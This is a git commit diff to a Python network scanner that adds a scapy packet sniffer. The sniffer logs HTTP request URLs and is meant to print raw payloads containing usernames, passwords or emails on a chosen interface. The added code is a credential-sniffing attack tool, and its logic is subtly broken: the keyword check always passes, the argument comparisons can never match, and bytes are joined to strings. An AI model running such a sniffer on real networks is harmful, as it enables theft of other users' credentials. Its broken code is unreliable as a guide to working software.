fd4bff4521b9a2f36ffc41dde16281a33086dc54
12sub <olasubomiwilliams1@gmail.com>
2024-04-08 21:33:12 +0100

    Added Packet sniffer

--- networkScanner.py
+++ networkScanner.py
@@ -1,10 +1,12 @@
 # from scapy.all import *
 import scapy.all as scapy
+from scapy.layers import http
 import argparse
 
 def parse():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="Target IP / IP range")
+    parser.add_argument("-i", "--interface", dest="interface", help="Target Interface")
     arguments = parser.parse_args()
     return arguments
 
@@ -26,8 +28,29 @@ def scan(ip):
 def print_result(result_list):
     print("IP\t\t\tMac Address\n- - - - - - - - - - - - - - - -")
     for client in result_list:
-        print(client["ip"] + "\t\t" + client["Mac"])           
+        print(client["ip"] + "\t\t" + client["Mac"]) 
+        
+def sniff(arguments):
+    scapy.sniff(iface=arguments, store=False, prn=process_sniffed_packet)
+    
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print("[+] Http Request >> " + url)
+        if packet.haslayer(scapy.Raw):
+            keys = ["username", "password", "pass", "email"]
+            for key in keys:
+                if key:
+                    print("[+] Passwords and Username >>" + packet[scapy.Raw].load)
+                    break
+
 
 arguments = parse()    
-result = scan(arguments.target) 
-print_result(result)   	
+
+
+if arguments == "wlan0":
+    sniff(arguments.interface)
+if arguments == "result":
+    result = scan(arguments.target)
+    print_result(result)
+  	
